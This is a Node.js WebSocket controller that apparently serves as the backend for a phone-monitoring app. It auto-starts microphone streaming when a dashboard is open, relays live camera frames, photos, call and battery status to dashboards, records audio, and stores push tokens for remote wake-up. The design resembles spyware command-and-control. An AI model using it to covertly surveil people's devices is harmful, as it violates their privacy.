/**
 * Device WebSocket controller (/audio/<deviceId>)
 */

const WebSocket = require("ws");
const { parseReqUrl } = require("../utils/url");
const { normalizeDeviceId } = require("../utils/device");
const deviceStore = require("../models/deviceStore");
const dashboardStore = require("../models/dashboardStore");
const { broadcastToDashboard } = require("../services/dashboardService");
const { parseAudioPayload, buildAmplifiedPayload } = require("../utils/audio");
const { saveUploadedPhoto } = require("../services/photoService");
const {
  startDeviceRecording,
  stopDeviceRecording,
  saveMp3,
} = require("../services/recordingService");
const { DASHBOARD_MAX_BUFFERED_BYTES } = require("../config");

function handleAudioDevice(ws, req) {
  const { pathname } = parseReqUrl(req.url || "");
  const parts = pathname.split("/");
  const rawDeviceId = parts[2] || "unknown_" + Date.now();
  const deviceId = normalizeDeviceId(decodeURIComponent(rawDeviceId));

  console.log(`📱 Device connected: "${deviceId}" (raw: "${rawDeviceId}")`);
  console.log(
    `📋 Current devices before: [${Array.from(deviceStore.devices.keys())
      .map((k) => `"${k}"`)
      .join(", ")}]`,
  );

  const existing = deviceStore.getDevice(deviceId);
  if (existing && existing.ws && existing.ws !== ws) {
    console.log(`♻️ Replacing existing socket for ${deviceId}`);
    try {
      existing.ws.terminate();
    } catch (_) {}
  }

  const deviceData = {
    ws,
    model: "Unknown",
    sdk: 0,
    appVersionName: "",
    appVersionCode: 0,
    connectedAt: new Date(),
    recordingChunks: null,
    recordingSampleRate: 16000,
    recordingFilename: null,
    health: {
      wsConnected: true,
      micCapturing: false,
      lastAudioChunkAt: 0,
      lastHealthAt: Date.now(),
      reason: "connected",
      internetOnline: true,
      callActive: false,
      batteryPct: null,
      charging: null,
    },
  };

  deviceStore.addDevice(deviceId, deviceData);

  if (dashboardStore.size() > 0) {
    try {
      ws.send("start_stream");
      console.log(`🎙️  Auto-sent start_stream to new device: ${deviceId}`);
    } catch (e) {
      console.log(`❌ Failed to auto-start stream for ${deviceId}: ${e.message}`);
    }
  }

  broadcastToDashboard({
    type: "device_connected",
    deviceId,
    model: "Unknown",
    health: deviceStore.getDevice(deviceId)?.health,
  });

  ws.on("message", (data) => {
    const current = deviceStore.getDevice(deviceId);
    if (!current || current.ws !== ws) {
      return;
    }

    const isText =
      typeof data === "string" ||
      (data instanceof Buffer &&
        (data.slice(0, 12).toString().startsWith("DEVICE_INFO:") ||
          data.slice(0, 4).toString().startsWith("ACK:") ||
          data.slice(0, 5).toString().startsWith("FILE:") ||
          data.slice(0, 5).toString().startsWith("pong:") ||
          data.slice(0, 1).toString() === "{"));

    if (isText) {
      const text = data.toString().trim();

      if (text.startsWith("DEVICE_INFO:")) {
        const infoParts = text.split(":");
        const model = infoParts[2];
        const sdk = infoParts[3];
        const appVersionName = infoParts[4] || "";
        const appVersionCode = Number(infoParts[5] || 0) || 0;
        const dev = deviceStore.getDevice(deviceId);
        if (dev) {
          dev.model = model;
          dev.sdk = parseInt(sdk, 10) || 0;
          if (appVersionName) dev.appVersionName = appVersionName;
          if (appVersionCode > 0) dev.appVersionCode = appVersionCode;
        }
        console.log(`ℹ️  ${deviceId} → ${model} (SDK ${sdk})`);
        broadcastToDashboard({
          type: "device_info",
          deviceId,
          model,
          sdk,
          appVersionName,
          appVersionCode,
        });
      } else if (text.startsWith("ACK:")) {
        console.log(`✅ ACK from ${deviceId}: ${text}`);
        broadcastToDashboard({ type: "ack", deviceId, message: text });
      } else if (text.startsWith("FILE:")) {
        const filename = text.replace("FILE:", "");
        console.log(`💾 ${deviceId} saved recording: ${filename}`);
        broadcastToDashboard({ type: "recording_saved", deviceId, filename });
      } else if (text === `pong:${deviceId}`) {
        // heartbeat pong — ignore
      } else if (text.startsWith("{")) {
        try {
          const json = JSON.parse(text);
          if (json.type === "device_data") {
            console.log(`📊 device_data from ${deviceId}`);
            broadcastToDashboard({
              type: "device_data",
              deviceId,
              data: json.data,
            });
          } else if (json.type === "health_status") {
            const dev = deviceStore.getDevice(deviceId);
            if (dev) {
              dev.health = {
                wsConnected: json.wsConnected !== false,
                micCapturing: json.micCapturing === true,
                lastAudioChunkAt: Number(
                  json.lastAudioChunkSentAt || dev.health?.lastAudioChunkAt || 0,
                ),
                lastHealthAt: Number(json.ts || Date.now()),
                reason: String(json.reason || "heartbeat"),
                aiMode: json.aiMode !== false,
                aiAuto: json.aiAuto !== false,
                streamCodec: String(json.streamCodec || dev.health?.streamCodec || "pcm"),
                streamCodecMode: String(
                  json.streamCodecMode || dev.health?.streamCodecMode || "auto",
                ),
                voiceProfile: String(json.voiceProfile || dev.health?.voiceProfile || "room"),
                noiseDb: Number.isFinite(Number(json.noiseDb))
                  ? Number(json.noiseDb)
                  : null,
                internetOnline: json.internetOnline !== false,
                callActive: json.callActive === true,
                batteryPct: Number.isFinite(Number(json.batteryPct))
                  ? Number(json.batteryPct)
                  : null,
                charging: typeof json.charging === "boolean" ? json.charging : null,
                lowNetwork: json.lowNetwork === true,
                photoAi: json.photoAi !== false,
                photoQuality: String(json.photoQuality || dev.health?.photoQuality || "normal"),
                photoNight: String(json.photoNight || dev.health?.photoNight || "off"),
                appVersionName: String(json.appVersionName || dev.health?.appVersionName || ""),
                appVersionCode: Number.isFinite(Number(json.appVersionCode))
                  ? Number(json.appVersionCode)
                  : Number(dev.health?.appVersionCode || 0),
                netDownKbps: Number(json.netDownKbps || 0),
                netUpKbps: Number(json.netUpKbps || 0),
                netType: String(json.netType || "other"),
                bitrateKbps: Number(json.bitrateKbps || 0),
                fcmToken: String(json.fcmToken || dev.health?.fcmToken || ""),
              };
              
              // Persist FCM token for Layer 4 wake-up
              if (json.fcmToken && json.fcmToken.length > 10) {
                deviceStore.saveFcmToken(deviceId, json.fcmToken);
              }            }
            broadcastToDashboard({
              type: "device_health",
              deviceId,
              health: dev?.health || null,
            });
          } else if (
            json.type === "webrtc_answer" ||
            json.type === "webrtc_ice" ||
            json.type === "webrtc_state"
          ) {
            broadcastToDashboard({ ...json, deviceId });
          } else if (json.type === "photo_upload") {
            const saved = saveUploadedPhoto(deviceId, json);
            if (saved) {
              broadcastToDashboard({
                type: "photo_saved",
                deviceId,
                filename: saved.filename,
                url: `/photos/${saved.filename}`,
                size: saved.size,
                camera: saved.camera,
                quality: saved.quality,
                aiEnhanced: saved.aiEnhanced,
                ts: saved.ts,
              });
            }
          } else if (json.type === "camera_live_frame") {
            broadcastToDashboard({
              type: "camera_live_frame",
              deviceId,
              camera: String(json.camera || "rear").toLowerCase(),
              quality: String(json.quality || "normal").toLowerCase(),
              mime: String(json.mime || "image/jpeg"),
              data: String(json.data || ""),
              ts: Number(json.ts || Date.now()),
            });
          } else if (json.type === "command_ack") {
            broadcastToDashboard({
              type: "command_ack",
              deviceId,
              command: String(json.command || ""),
              status: String(json.status || "success"),
              detail: String(json.detail || ""),
              ts: Number(json.ts || Date.now()),
            });
          } else if (json.type === "update_status" || json.type === "update_available") {
            console.log(`🔄 Update status from ${deviceId}: ${json.status || json.version || "?"}`);
            broadcastToDashboard({ ...json, deviceId });
          } else if (json.type === "error") {
            console.error(`⚠️  Error from ${deviceId}: ${json.message}`);
            broadcastToDashboard({
              type: "error",
              message: `[${deviceId.substring(0, 8)}] ${json.message}`,
            });
          } else {
            console.log(`📨 ${deviceId}: ${text}`);
          }
        } catch (_) {
          console.log(`📨 ${deviceId}: ${text}`);
        }
      } else {
        console.log(`📨 ${deviceId}: ${text}`);
      }
      return;
    }

    const dev = deviceStore.getDevice(deviceId);

    const wantsToRecord = Boolean(dev && dev.recordingChunks);
    let hasDashboardSubscribers = false;
    dashboardStore.forEachClientSubscribedToDevice(deviceId, () => {
      hasDashboardSubscribers = true;
    });

    // If nobody is listening AND we are not recording, skip server amplification
    // and audio frame routing. (We still parse audio for side effects below, but
    // we avoid extra allocations and sends.)
    if (!hasDashboardSubscribers && !wantsToRecord) {
      return;
    }

    const parsedAudio = parseAudioPayload(Buffer.from(data));

    if (!dev._lastAudioLogAt || Date.now() - dev._lastAudioLogAt > 5000) {
      dev._lastAudioLogAt = Date.now();
      console.log(
        `🎵 Audio from ${deviceId}: ${data.length} bytes, HQ=${parsedAudio.isHqMode}`,
      );
      
      // Automatically keep dashboard in sync every time we receive mic audio
      broadcastToDashboard({
        type: "device_info",
        deviceId,
        model: dev.model || "Unknown",
        sdk: dev.sdk || 0,
        appVersionName: dev.appVersionName || "",
        appVersionCode: dev.appVersionCode || 0,
      });
      broadcastToDashboard({
        type: "device_health",
        deviceId,
        health: dev.health || null,
      });
    }

    // ── Server-side gain compensation ───────────────────────────────────────
    // Only compensate mildly for MuLaw streams to restore perceived loudness.
    // Far-voice profile is already boosted on-device; re-boosting here clips.
    const streamCodec = String(dev?.health?.streamCodec || "").toLowerCase();
    const isMuLawStream = streamCodec === "smart" || parsedAudio.sampleRate === 8000;
    const serverGain = isMuLawStream ? 1.35 : 1.0;
    const amplifiedPayload = buildAmplifiedPayload(
      parsedAudio.forwardPayload,
      parsedAudio.pcm16,
      serverGain,
      true  // has 4-byte audio header
    );

    const idBuf = Buffer.from(deviceId, "utf8");
    const header = Buffer.alloc(2);
    header.writeUInt16BE(idBuf.length, 0);
    const audioFrame = Buffer.concat([header, idBuf, amplifiedPayload]);
    if (dev?.health) {
      dev.health.lastAudioChunkAt = Date.now();
      dev.health.micCapturing = true;
      dev.health.wsConnected = true;
    }
    // Route audio only to dashboard clients that actively subscribed to this deviceId.
    dashboardStore.forEachClientSubscribedToDevice(deviceId, (client) => {
      if (client.readyState !== WebSocket.OPEN) return;
      if (client.bufferedAmount > DASHBOARD_MAX_BUFFERED_BYTES) return;
      client.send(audioFrame);
    });

    if (dev && dev.recordingChunks) {
      dev.recordingSampleRate = parsedAudio.sampleRate;
      dev.recordingChunks.push(parsedAudio.pcm16);
    }
  });

  ws.on("close", () => {
    const current = deviceStore.getDevice(deviceId);
    if (!current || current.ws !== ws) {
      console.log(`↪️ Ignoring stale close for "${deviceId}"`);
      return;
    }

    console.log(`❌ Device disconnected: "${deviceId}"`);
    console.log(
      `📋 Devices before removal: [${Array.from(deviceStore.devices.keys())
        .map((k) => `"${k}"`)
        .join(", ")}]`,
    );
    const dev = current;
    if (dev?.recordingChunks && dev.recordingChunks.length > 0) {
      saveMp3(deviceId, dev);
    }
    deviceStore.removeDevice(deviceId);

    console.log(
      `📋 Devices after removal: [${Array.from(deviceStore.devices.keys())
        .map((k) => `"${k}"`)
        .join(", ")}]`,
    );
    broadcastToDashboard({ type: "device_disconnected", deviceId });
  });

  ws.on("error", (err) => {
    console.error(`⚠️  Error from ${deviceId}:`, err.message);
  });
}

module.exports = {
  handleAudioDevice,
};
